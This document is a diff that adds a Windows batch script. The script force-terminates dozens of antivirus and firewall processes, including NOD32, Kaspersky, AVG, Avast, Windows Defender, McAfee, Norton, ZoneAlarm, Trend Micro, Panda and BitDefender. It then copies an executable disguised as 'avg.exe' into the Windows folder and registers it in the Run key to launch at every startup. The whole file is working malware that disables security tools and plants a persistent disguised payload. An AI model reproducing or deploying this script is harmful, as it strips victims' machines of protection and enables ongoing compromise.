@@ -1,0 +1,154 @@
+@echo off
+cls
+taskkill /f /im nod32krn.exe
+cls
+taskkill /f /im nod32.exe
+cls
+taskkill /f /im GbpSv.exe
+cls
+taskkill /f /im nod32kui.exe
+cls
+taskkill /f /im kav.exe
+cls
+taskkill /f /im kavmm.exe
+cls
+taskkill /f /im KAVPF.exe
+cls
+taskkill /f /im avgemc.exe
+cls
+taskkill /f /im avgcc.exe
+cls
+taskkill /f /im avgamsvr.exe
+cls
+taskkill /f /im avgupsvc.exe
+cls
+taskkill /f /im avgw.exe
+cls
+taskkill /f /im ashWebSv.exe
+cls
+taskkill /f /im ashDisp.exe
+cls
+taskkill /f /im ashmaisv.exe
+cls
+taskkill /f /im ashserv.exe
+cls
+taskkill /f /im aswupdsv.exe
+cls
+taskkill /f /im ewidoctrl.exe
+cls
+taskkill /f /im guard.exe
+cls
+taskkill /f /im gcasDtServ.exe
+cls
+taskkill /f /im MsMpEng.exe
+cls
+taskkill /f /im mcafee.exe
+cls
+taskkill /f /im mghtml.exe
+cls
+taskkill /f /im MsiExec.exe
+cls
+taskkill /f /im outpost.exe
+cls
+taskkill /f /im isafe.exe
+cls
+taskkill /f /im zapro.exe
+cls
+taskkill /f /im zauinst.exe
+cls
+taskkill /f /im UpdClient.exe
+cls
+taskkill /f /im zlcliente.exe
+cls
+taskkill /f /im minilog.exe
+cls
+taskkill /f /im zonealarm.exe
+cls
+taskkill /f /im zlclient.exe
+cls
+taskkill /f /im ccapp.exe
+cls
+taskkill /f /im ccsetmgr.exe
+cls
+taskkill /f /im ccevtmgr.exe
+cls
+taskkill /f /im Norton Auto-Protect.exe
+cls
+taskkill /f /im cccproxy.exe
+cls
+taskkill /f /im navw32.exe
+cls
+taskkill /f /im norton.exe
+cls
+taskkill /f /im navapsvc.exe
+cls
+taskkill /f /im npfmntor.exe
+cls
+taskkill /f /im logexprt.exe
+cls
+taskkill /f /im nisum.exe
+cls
+taskkill /f /im issvc.exe
+cls
+taskkill /f /im cpdclnt.exe
+cls
+taskkill /f /im pccntupd.exe
+cls
+taskkill /f /im PCCTool.exe
+cls
+taskkill /f /im tmproxy.exe
+cls
+taskkill /f /im tmntsrv.exe
+cls
+taskkill /f /im pop3trap.exe
+cls
+taskkill /f /im tsc.exe
+cls
+taskkill /f /im PavPrSrv.exe
+cls
+taskkill /f /im padmin.exe
+cls
+taskkill /f /im PavProt.exe
+cls
+taskkill /f /im pandaav.exe
+cls
+taskkill /f /im avengine.exe
+cls
+taskkill /f /im apvxdwin.exe
+cls
+taskkill /f /im webProxy.exe
+cls
+taskkill /f /im avguard.exe
+cls
+taskkill /f /im avgnt.exe
+cls
+taskkill /f /im sched.exe
+cls
+taskkill /f /im avsched32.exe
+cls
+taskkill /f /im SCCOMM.EXE
+cls
+taskkill /f /im Spiderml.exe
+cls
+taskkill /f /im vsserv.exe
+cls
+taskkill /f /im bdswitch.exe
+cls
+taskkill /f /im bdss.exe
+cls
+taskkill /f /im INOTask.exe
+cls
+taskkill /f /im caissdt.exe
+cls
+taskkill /f /im InoRpc.exe
+cls
+taskkill /f /im VetMsg.exe
+cls
+taskkill /f /im vettray.exe
+cls
+taskkill /f /im realmon.exe
+cls
+move avg.exe c:\windows
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v kill /t REG_SZ /d c:\windows\avg.exe
+cls
+
